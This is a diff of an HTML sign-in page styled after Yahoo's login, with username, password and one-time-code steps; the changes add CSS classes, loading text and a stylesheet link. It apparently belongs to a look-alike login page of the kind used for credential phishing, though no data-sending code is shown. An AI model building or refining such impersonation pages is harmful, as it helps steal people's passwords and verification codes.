@@ -10,6 +10,7 @@
   <style>
    body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; height: 100vh; } .login-side { width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; box-sizing: border-box; background-color: #fff; } .ad-side { display: none; width: 50%; background-color: #f0f3f7; background-image: url('https://s.yimg.com/wm/login/2-0-12/assets/login-hero-2.svg'); background-size: cover; background-position: center; } @media (min-width: 1024px) { .ad-side { display: block; width: 40%; } .login-side { width: 60%; } } .login-box { width: 100%; max-width: 360px; text-align: center; } .logo-center { margin-bottom: 30px; } .logo-center img { height: 36px; } .step-container { transition: opacity 0.3s ease-in-out; } .hidden { display: none; opacity: 0; } .fade-in { animation: fadeIn 0.5s; } @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; color: #26282a; margin-top: 0; } p { font-size: 16px; color: #26282a; margin-bottom: 40px; } .user-greeting { font-size: 18px; font-weight: 400; margin-bottom: 6px; color: #26282a; } .user-email-display { font-size: 14px; font-weight: 600; color: #26282a; margin-bottom: 40px; } .input-group { position: relative; margin-bottom: 24px; text-align: left; } input { width: 100%; border: none; border-bottom: 1px solid #e0e4e9; padding: 12px 0 4px; font-size: 16px; color: #26282a; box-sizing: border-box; transition: border-bottom-color 0.2s; background: transparent; height: 32px; } input:focus { border-bottom-color: #188fff; outline: none; } label { position: absolute; left: 0; top: 10px; color: #6e7780; font-size: 16px; pointer-events: none; transition: 0.2s ease all; } input:focus ~ label, input:not(:placeholder-shown) ~ label { top: -10px; font-size: 12px; color: #6e7780; } .password-toggle { position: absolute; right: 0; top: 8px; background: none; border: none; cursor: pointer; padding: 0; } .password-toggle svg { width: 24px; height: 24px; fill: #6e7780; } .next-btn { background-color: #188fff; color: #fff; border: none; border-radius: 24px; width: 100%; padding: 12px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s; } .next-btn:hover { background-color: #0074cc; } .secondary-btn { background-color: transparent; color: #188fff; border: 1px solid #188fff; border-radius: 24px; width: 100%; padding: 12px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s; } .secondary-btn:hover { background-color: #f0f8ff; } .checkbox-wrapper { display: flex; align-items: center; margin-bottom: 24px; justify-content: flex-start; } .checkbox-wrapper input { width: auto; margin-right: 10px; height: auto; } .checkbox-wrapper label { position: static; font-size: 14px; color: #26282a; } .links { margin-top: 20px; font-size: 14px; } .links a { color: #188fff; text-decoration: none; margin: 0 5px; } .links a:hover { text-decoration: underline; } .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-right: 8px; vertical-align: middle; } @keyframes spin { to { transform: rotate(360deg); } } .error-message { color: #f0162f; font-size: 14px; margin-bottom: 20px; display: none; text-align: left; } .header-top { position: absolute; top: 20px; right: 40px; display: flex; align-items: center; } .header-top a { text-decoration: none; color: #188fff; font-size: 14px; font-weight: 600; } .header-top svg { width: 20px; height: 20px; margin-left: 5px; fill: #188fff; }
   </style>
+  <link href="/core/assets/css/animations.css" rel="stylesheet"/>
  </head>
  <body>
   <div class="ad-side">
@@ -35,7 +36,7 @@
      </p>
      <form>
       <div class="input-group">
-       <input id="username" placeholder=" " required="" type="text"/>
+       <input class="input-field" id="username" placeholder=" " required="" type="text"/>
        <label for="username">
         Username, email, or mobile
        </label>
@@ -46,13 +47,13 @@
         Stay signed in
        </label>
       </div>
-      <button class="next-btn" id="btn-next" type="submit">
+      <button class="next-btn btn-primary" data-loading-text="Verifying..." id="btn-next" type="submit">
        Next
       </button>
-      <button class="secondary-btn" type="button">
+      <button class="secondary-btn btn-primary" type="button">
        Forgot username?
       </button>
-      <button class="secondary-btn" style="border-color: #e0e4e9; color: #26282a;" type="button">
+      <button class="secondary-btn btn-primary" style="border-color: #e0e4e9; color: #26282a;" type="button">
        Create an account
       </button>
       <div style="margin-top: 20px; font-size: 12px; color: #6e7780;">
@@ -76,18 +77,18 @@
      </div>
      <form>
       <div class="input-group">
-       <input id="password" placeholder=" " required="" type="password"/>
+       <input class="input-field" id="password" placeholder=" " required="" type="password"/>
        <label for="password">
         Password
        </label>
-       <button class="password-toggle" onclick="togglePassword()" type="button">
+       <button class="password-toggle btn-primary" onclick="togglePassword()" type="button">
         <svg viewbox="0 0 24 24">
          <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z">
          </path>
         </svg>
        </button>
       </div>
-      <button class="next-btn" id="btn-login" type="submit">
+      <button class="next-btn btn-primary" data-loading-text="Verifying..." id="btn-login" type="submit">
        Next
       </button>
       <div style="margin-top: 10px;">
@@ -140,8 +141,8 @@
    <p style="margin-bottom: 20px; color: #666;">
     Please enter the code sent to your device.
    </p>
-   <input id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;" type="text"/>
-   <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
+   <input class="input-field" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;" type="text"/>
+   <button class="btn-primary" id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
     Verify
    </button>
   </div>
